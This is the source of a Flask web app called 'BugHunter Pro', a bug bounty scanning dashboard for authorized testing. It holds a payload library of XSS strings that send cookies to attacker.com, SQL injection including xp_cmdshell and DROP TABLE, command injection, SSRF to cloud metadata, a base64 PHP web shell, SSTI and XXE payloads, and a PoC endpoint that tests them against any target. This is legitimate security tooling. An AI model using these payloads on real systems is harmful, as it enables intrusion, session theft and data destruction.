#!/usr/bin/env python3
"""
BugHunter Pro - Professional Bug Bounty Web UI v2.1
Based on claude-bug-bounty by shuvonsec
For authorized security testing only.
"""

import os
import json
import uuid
import time
import threading
from datetime import datetime
from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO, emit, join_room
from flask_cors import CORS
import urllib.parse

# Import scanners
from scanners.recon_engine import ReconEngine
from scanners.idor_scanner import IDORScanner
from scanners.xss_scanner import XSSScanner
from scanners.ssrf_scanner import SSRFScanner
from scanners.sqli_scanner import SQLiScanner
from scanners.oauth_tester import OAuthTester
from scanners.race_condition import RaceConditionScanner
from scanners.cve_hunter import CVEHunter
from scanners.poc_generator import PoCGenerator
from scanners.report_generator import ReportGenerator

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', os.urandom(24).hex())
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024

CORS(app, resources={r"/*": {"origins": "*"}})
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading',
                    logger=False, engineio_logger=False)

# ─────────────────────────────────────────────
# In-memory stores
# ─────────────────────────────────────────────
active_scans = {}
findings_db = {}
targets_store = []   # Persisted target list

# Built-in payload library
PAYLOAD_LIBRARY = {
    "xss": {
        "name": "Cross-Site Scripting",
        "payloads": [
            '<script>alert(1)</script>',
            '"><script>alert(document.cookie)</script>',
            "<svg onload=alert(1)>",
            "<img src=x onerror=fetch('https://attacker.com/?c='+document.cookie)>",
            "';alert(1)//",
            '{{7*7}}',
            '<math><mtext></table><img src=x onerror=alert(1)>',
            "<iframe srcdoc='<script>alert(1)</script>'>",
            "<details open ontoggle=alert(1)>",
            '<script>fetch("https://attacker.com/steal?c="+btoa(document.cookie))</script>',
        ]
    },
    "sqli": {
        "name": "SQL Injection",
        "payloads": [
            "'",
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' AND SLEEP(5)--",
            "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
            "1; DROP TABLE users--",
            "' OR '1'='1' /*",
            "'; EXEC xp_cmdshell('whoami')--",
            "admin'--",
        ]
    },
    "ssrf": {
        "name": "Server-Side Request Forgery",
        "payloads": [
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://localhost/",
            "http://127.0.0.1/",
            "http://[::1]/",
            "http://0177.0.0.1/",
            "http://2130706433/",
            "file:///etc/passwd",
            "dict://localhost:6379/info",
            "gopher://127.0.0.1:6379/_INFO",
        ]
    },
    "lfi": {
        "name": "Local File Inclusion",
        "payloads": [
            "../../../../etc/passwd",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "/etc/passwd",
            "php://filter/read=convert.base64-encode/resource=index.php",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
            "expect://id",
            "zip://shell.jpg%23shell.php",
            "phar://test.phar/test.txt",
        ]
    },
    "rce": {
        "name": "Remote Code Execution",
        "payloads": [
            "; id",
            "| id",
            "& id",
            "; cat /etc/passwd",
            "`id`",
            "$(id)",
            "; curl http://169.254.169.254/",
            "|| id",
            "&& id",
            "; sleep 5",
        ]
    },
    "idor": {
        "name": "Insecure Direct Object Reference",
        "payloads": [
            "1", "2", "3", "0", "-1",
            "admin", "../admin",
            "00000000-0000-0000-0000-000000000001",
            "1 OR 1=1",
            "' OR 1=1--",
        ]
    },
    "jwt": {
        "name": "JWT Attacks",
        "payloads": [
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
        ]
    },
    "ssti": {
        "name": "Server-Side Template Injection",
        "payloads": [
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            "{{config}}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
            "#set($x=$class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke($class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id'))",
        ]
    },
    "xxe": {
        "name": "XML External Entity",
        "payloads": [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
            '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><test></test>',
        ]
    },
    "open_redirect": {
        "name": "Open Redirect",
        "payloads": [
            "https://evil.com",
            "//evil.com",
            "/\\evil.com",
            "https://evil.com%23",
            "https://evil.com?next=legit.com",
            "javascript:alert(document.domain)",
            "data:text/html,<script>window.location='https://evil.com'</script>",
        ]
    },
    "csrf": {
        "name": "Cross-Site Request Forgery",
        "payloads": [
            '<form action="https://victim.com/api/change-email" method="POST"><input name="email" value="attacker@evil.com"><input type="submit"></form>',
            '<img src="https://victim.com/api/transfer?to=attacker&amount=1000">',
        ]
    },
}


# ─────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────
def _get_json_safe():
    """Safe JSON body parser - returns empty dict on failure."""
    try:
        data = request.get_json(force=True, silent=True)
        return data if isinstance(data, dict) else {}
    except Exception:
        return {}


def _copy_finding(f, scan_id=None):
    """Return a shallow copy of a finding, optionally adding scan_id."""
    out = dict(f)
    if scan_id is not None:
        out['scan_id'] = scan_id
    return out


# ─────────────────────────────────────────────
# ROUTES - Main UI
# ─────────────────────────────────────────────
@app.route('/')
def index():
    return render_template('index.html')


@app.route('/health')
def health():
    return jsonify({
        'status': 'ok',
        'version': '2.1.0',
        'timestamp': datetime.utcnow().isoformat(),
        'active_scans': len(active_scans),
        'total_findings': sum(len(f) for f in findings_db.values()),
    })


# ─────────────────────────────────────────────
# API - Stats Dashboard
# ─────────────────────────────────────────────
@app.route('/api/stats')
def get_stats():
    total_scans = len(active_scans)
    total_findings = sum(len(f) for f in findings_db.values())

    severity_count = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0, 'info': 0}
    vuln_types = {}

    for findings in findings_db.values():
        for f in findings:
            sev = f.get('severity', 'info').lower()
            severity_count[sev] = severity_count.get(sev, 0) + 1
            vtype = f.get('type', 'Unknown')
            vuln_types[vtype] = vuln_types.get(vtype, 0) + 1

    running = sum(1 for s in active_scans.values() if s['status'] == 'running')

    return jsonify({
        'total_scans': total_scans,
        'running_scans': running,
        'total_findings': total_findings,
        'severity_breakdown': severity_count,
        'vuln_types': vuln_types,
    })


# ─────────────────────────────────────────────
# API - Scan control
# ─────────────────────────────────────────────
@app.route('/api/scan/start', methods=['POST'])
def start_scan():
    data = _get_json_safe()
    target = data.get('target', '').strip()
    scan_types = data.get('scan_types', ['recon'])
    scan_depth = data.get('depth', 'medium')

    if not target:
        return jsonify({'error': 'Target is required'}), 400

    # Validate target format
    if not (target.startswith('http') or '.' in target):
        return jsonify({'error': 'Invalid target format'}), 400

    # Sanitise scan_types
    allowed_types = {'recon', 'idor', 'xss', 'ssrf', 'sqli', 'oauth', 'race', 'cve'}
    if not isinstance(scan_types, list):
        scan_types = ['recon']
    scan_types = [t for t in scan_types if t in allowed_types] or ['recon']

    scan_id = str(uuid.uuid4())[:8]
    active_scans[scan_id] = {
        'id': scan_id,
        'target': target,
        'status': 'running',
        'start_time': datetime.utcnow().isoformat(),
        'end_time': None,
        'scan_types': scan_types,
        'depth': scan_depth,
        'findings': [],
        'progress': 0,
        'current_stage': 'Starting',
    }
    findings_db[scan_id] = []

    thread = threading.Thread(
        target=run_scan_pipeline,
        args=(scan_id, target, scan_types, scan_depth),
        daemon=True
    )
    thread.start()

    return jsonify({'scan_id': scan_id, 'status': 'started', 'target': target})


@app.route('/api/scan/stop/<scan_id>', methods=['POST'])
def stop_scan(scan_id):
    if scan_id not in active_scans:
        return jsonify({'error': 'Scan not found'}), 404
    active_scans[scan_id]['status'] = 'stopped'
    active_scans[scan_id]['end_time'] = datetime.utcnow().isoformat()
    try:
        socketio.emit('scan_stopped', {'scan_id': scan_id}, room=scan_id)
    except Exception:
        pass
    return jsonify({'status': 'stopped', 'scan_id': scan_id})


@app.route('/api/scan/status/<scan_id>')
def scan_status(scan_id):
    if scan_id not in active_scans:
        return jsonify({'error': 'Scan not found'}), 404
    return jsonify(active_scans[scan_id])


@app.route('/api/scan/list')
def scan_list():
    return jsonify(list(active_scans.values()))


@app.route('/api/scan/delete/<scan_id>', methods=['DELETE'])
def delete_scan(scan_id):
    if scan_id not in active_scans:
        return jsonify({'error': 'Scan not found'}), 404
    if active_scans[scan_id]['status'] == 'running':
        return jsonify({'error': 'Cannot delete a running scan. Stop it first.'}), 400
    active_scans.pop(scan_id, None)
    findings_db.pop(scan_id, None)
    return jsonify({'status': 'deleted', 'scan_id': scan_id})


# ─────────────────────────────────────────────
# API - Findings  (static route MUST come before dynamic)
# ─────────────────────────────────────────────
@app.route('/api/findings/all')
def get_all_findings():
    all_findings = []
    for sid, findings in findings_db.items():
        for f in findings:
            all_findings.append(_copy_finding(f, scan_id=sid))
    return jsonify(all_findings)


@app.route('/api/findings/<scan_id>')
def get_findings(scan_id):
    if scan_id not in findings_db:
        return jsonify({'error': 'Scan not found'}), 404
    return jsonify(findings_db[scan_id])


# ─────────────────────────────────────────────
# API - PoC Generator
# ─────────────────────────────────────────────
@app.route('/api/poc/generate', methods=['POST'])
def generate_poc():
    data = _get_json_safe()
    vuln_type = data.get('type')
    target = data.get('target', 'https://target.example.com')
    params = data.get('params', {})

    if not vuln_type:
        return jsonify({'error': 'type is required'}), 400

    poc = PoCGenerator.generate(vuln_type, target, params)
    if not poc or 'error' in poc:
        return jsonify(poc or {'error': f'Unknown vulnerability type: {vuln_type}'}), 400
    return jsonify(poc)


@app.route('/api/poc/test', methods=['POST'])
def test_poc():
    data = _get_json_safe()
    vuln_type = data.get('type')
    target = data.get('target')
    payload = data.get('payload', '')

    if not vuln_type or not target:
        return jsonify({'error': 'type and target are required'}), 400

    result = PoCGenerator.test_poc(vuln_type, target, payload)
    return jsonify(result)


@app.route('/api/poc/types')
def poc_types():
    """Return list of supported PoC types."""
    types = [
        {'id': 'xss', 'name': 'Cross-Site Scripting (XSS)', 'severity': 'High', 'cvss': 7.4},
        {'id': 'sqli', 'name': 'SQL Injection', 'severity': 'Critical', 'cvss': 9.8},
        {'id': 'ssrf', 'name': 'SSRF', 'severity': 'Critical', 'cvss': 9.8},
        {'id': 'idor', 'name': 'IDOR', 'severity': 'High', 'cvss': 7.5},
        {'id': 'lfi', 'name': 'Local File Inclusion', 'severity': 'High', 'cvss': 7.5},
        {'id': 'rce', 'name': 'Remote Code Execution', 'severity': 'Critical', 'cvss': 9.8},
        {'id': 'xxe', 'name': 'XML External Entity (XXE)', 'severity': 'High', 'cvss': 8.2},
        {'id': 'ssti', 'name': 'Server-Side Template Injection', 'severity': 'Critical', 'cvss': 9.8},
        {'id': 'csrf', 'name': 'Cross-Site Request Forgery', 'severity': 'Medium', 'cvss': 6.5},
        {'id': 'jwt_none', 'name': 'JWT None Algorithm', 'severity': 'Critical', 'cvss': 9.1},
        {'id': 'log4shell', 'name': 'Log4Shell (CVE-2021-44228)', 'severity': 'Critical', 'cvss': 10.0},
        {'id': 'open_redirect', 'name': 'Open Redirect', 'severity': 'Medium', 'cvss': 5.4},
    ]
    return jsonify(types)


# ─────────────────────────────────────────────
# API - Report Generator
# ─────────────────────────────────────────────
@app.route('/api/report/generate', methods=['POST'])
def generate_report():
    data = _get_json_safe()
    scan_id = data.get('scan_id')
    report_format = data.get('format', 'hackerone')

    if not scan_id:
        return jsonify({'error': 'scan_id is required'}), 400

    if scan_id not in findings_db:
        return jsonify({'error': 'Scan not found'}), 404

    report = ReportGenerator.generate(
        scan_id=scan_id,
        findings=findings_db[scan_id],
        scan_info=active_scans.get(scan_id, {'target': 'Unknown'}),
        report_format=report_format
    )
    return jsonify(report)


# ─────────────────────────────────────────────
# API - Payload Library
# ─────────────────────────────────────────────
@app.route('/api/payloads')
def get_payloads():
    category = request.args.get('category', '').lower()
    if category and category in PAYLOAD_LIBRARY:
        return jsonify({category: PAYLOAD_LIBRARY[category]})
    return jsonify(PAYLOAD_LIBRARY)


@app.route('/api/payloads/<category>')
def get_payloads_by_category(category):
    cat = category.lower()
    if cat not in PAYLOAD_LIBRARY:
        return jsonify({'error': f'Category not found: {category}'}), 404
    return jsonify(PAYLOAD_LIBRARY[cat])


# ─────────────────────────────────────────────
# API - Target Manager
# ─────────────────────────────────────────────
@app.route('/api/targets', methods=['GET'])
def list_targets():
    return jsonify(targets_store)


@app.route('/api/targets', methods=['POST'])
def add_target():
    data = _get_json_safe()
    target_url = data.get('target', '').strip()
    if not target_url:
        return jsonify({'error': 'target is required'}), 400
    entry = {
        'id': str(uuid.uuid4())[:8],
        'target': target_url,
        'label': data.get('label', target_url),
        'tags': data.get('tags', []),
        'added_at': datetime.utcnow().isoformat(),
        'scan_count': 0,
    }
    targets_store.append(entry)
    return jsonify(entry), 201


@app.route('/api/targets/<target_id>', methods=['DELETE'])
def delete_target(target_id):
    global targets_store
    before = len(targets_store)
    targets_store = [t for t in targets_store if t['id'] != target_id]
    if len(targets_store) == before:
        return jsonify({'error': 'Target not found'}), 404
    return jsonify({'status': 'deleted', 'id': target_id})


# ─────────────────────────────────────────────
# WebSocket Events
# ─────────────────────────────────────────────
@socketio.on('connect')
def handle_connect():
    emit('connected', {'status': 'ok', 'timestamp': time.time(), 'version': '2.1.0'})


@socketio.on('join_scan')
def handle_join_scan(data):
    scan_id = data.get('scan_id')
    if scan_id:
        join_room(scan_id)
        emit('joined', {'scan_id': scan_id, 'status': 'ok'})


@socketio.on('disconnect')
def handle_disconnect():
    pass  # cleanup handled automatically by flask-socketio


# ─────────────────────────────────────────────
# CORE - Scan Pipeline helpers
# ─────────────────────────────────────────────
def emit_log(scan_id, message, level='info', tool=None):
    """Emit log message to WebSocket clients in a thread-safe way."""
    log_entry = {
        'scan_id': scan_id,
        'message': message,
        'level': level,
        'tool': tool or 'scanner',
        'timestamp': datetime.utcnow().strftime('%H:%M:%S'),
    }
    try:
        socketio.emit('scan_log', log_entry, room=scan_id)
    except Exception:
        pass


def emit_finding(scan_id, finding):
    """Emit a new finding to WebSocket clients."""
    finding = dict(finding)   # don't mutate caller's dict
    finding['id'] = str(uuid.uuid4())[:8]
    finding['timestamp'] = datetime.utcnow().isoformat()
    finding.setdefault('severity', 'info')
    finding.setdefault('cvss', 0)
    finding.setdefault('cwe', 'N/A')
    finding.setdefault('remediation', 'See OWASP guidance for this vulnerability class.')

    findings_db.setdefault(scan_id, []).append(finding)
    if scan_id in active_scans:
        active_scans[scan_id]['findings'].append(finding['id'])

    try:
        socketio.emit('new_finding', finding, room=scan_id)
    except Exception:
        pass


def update_progress(scan_id, progress, stage):
    """Update scan progress and broadcast to clients."""
    if scan_id not in active_scans:
        return
    active_scans[scan_id]['progress'] = progress
    active_scans[scan_id]['current_stage'] = stage
    try:
        socketio.emit('progress_update', {
            'scan_id': scan_id,
            'progress': progress,
            'stage': stage,
        }, room=scan_id)
    except Exception:
        pass


def _is_running(scan_id):
    """Check if a scan is still in running state."""
    return active_scans.get(scan_id, {}).get('status') == 'running'


# ─────────────────────────────────────────────
# CORE - Scan Pipeline
# ─────────────────────────────────────────────
def run_scan_pipeline(scan_id, target, scan_types, depth):
    """Main scan pipeline orchestrator - runs in a daemon thread."""
    try:
        emit_log(scan_id, f"🎯 Starting scan on: {target}", 'info')
        emit_log(scan_id, f"📋 Modules: {', '.join(scan_types)}", 'info')
        emit_log(scan_id, f"🔧 Depth: {depth}", 'info')
        emit_log(scan_id, "─" * 60, 'separator')

        stage_map = [
            ('recon',  10, 25, 'Reconnaissance', ReconEngine),
            ('idor',   30, 40, 'IDOR Scanning',  IDORScanner),
            ('xss',    45, 55, 'XSS Scanning',   XSSScanner),
            ('ssrf',   60, 70, 'SSRF Scanning',  SSRFScanner),
            ('sqli',   72, 80, 'SQLi Scanning',  SQLiScanner),
            ('oauth',  82, 88, 'OAuth Testing',  OAuthTester),
            ('race',   88, 92, 'Race Conditions',RaceConditionScanner),
            ('cve',    92, 97, 'CVE Hunting',    CVEHunter),
        ]

        for key, prog_start, prog_end, label, ScannerClass in stage_map:
            if key not in scan_types or not _is_running(scan_id):
                continue
            update_progress(scan_id, prog_start, label)
            emit_log(scan_id, f"🔍 [{label}] starting...", 'stage', key)
            try:
                scanner = ScannerClass(target, scan_id, socketio, emit_log, emit_finding)
                if key == 'recon':
                    recon_data = scanner.run(depth)
                    active_scans[scan_id]['recon_data'] = recon_data
                else:
                    scanner.run()
                update_progress(scan_id, prog_end, f"{label} ✓")
            except Exception as stage_err:
                emit_log(scan_id, f"⚠️ [{label}] error: {stage_err}", 'warning', key)

        # Finalise
        total = len(findings_db.get(scan_id, []))
        update_progress(scan_id, 100, 'Complete')
        emit_log(scan_id, "─" * 60, 'separator')
        emit_log(scan_id, f"✅ Scan Complete!  Total findings: {total}", 'success')

        if scan_id in active_scans:
            active_scans[scan_id]['status'] = 'completed'
            active_scans[scan_id]['end_time'] = datetime.utcnow().isoformat()

        try:
            socketio.emit('scan_complete', {
                'scan_id': scan_id,
                'total_findings': total,
                'findings': findings_db.get(scan_id, []),
            }, room=scan_id)
        except Exception:
            pass

    except Exception as e:
        emit_log(scan_id, f"❌ Fatal scan error: {e}", 'error')
        if scan_id in active_scans:
            active_scans[scan_id]['status'] = 'error'
            active_scans[scan_id]['error'] = str(e)


# ─────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    host = os.environ.get('HOST', '127.0.0.1')
    debug = os.environ.get('DEBUG', 'false').lower() == 'true'

    print("""
    ╔══════════════════════════════════════════╗
    ║      BugHunter Pro - Web UI v2.1         ║
    ║   Professional Bug Bounty Platform       ║
    ║   For authorized testing only!           ║
    ╚══════════════════════════════════════════╝
    """)
    print(f"    ▶  Listening on http://{host}:{port}")
    socketio.run(app, host=host, port=port, debug=debug, allow_unsafe_werkzeug=True)
